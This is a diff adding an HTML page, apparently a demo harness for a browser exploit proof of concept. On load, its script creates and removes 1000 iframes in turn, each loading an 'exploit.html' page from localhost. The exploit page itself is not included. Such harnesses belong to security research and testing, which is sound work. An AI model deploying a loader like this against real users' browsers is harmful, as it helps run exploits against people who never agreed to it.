@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        // Create iframes with different domains
+        // In demo, we will open the page with localhost:8000
+        async function createIframes() {
+          const baseUrl = 'http://127.0.0.1:8000';
+
+          const numIframes = 1000;
+
+          for (let i = 1; i <= numIframes; i++) {
+            const iframe = document.createElement('iframe');
+
+            iframe.src = `${baseUrl}/exploit.html`;
+            iframe.width = '300';
+            iframe.height = '200';
+
+            document.body.appendChild(iframe);
+            await new Promise(r => setTimeout(r, 500));
+            document.body.removeChild(iframe);
+          }
+        }
+
+        window.onload = createIframes;
+      </script>
+</body>
+</html>
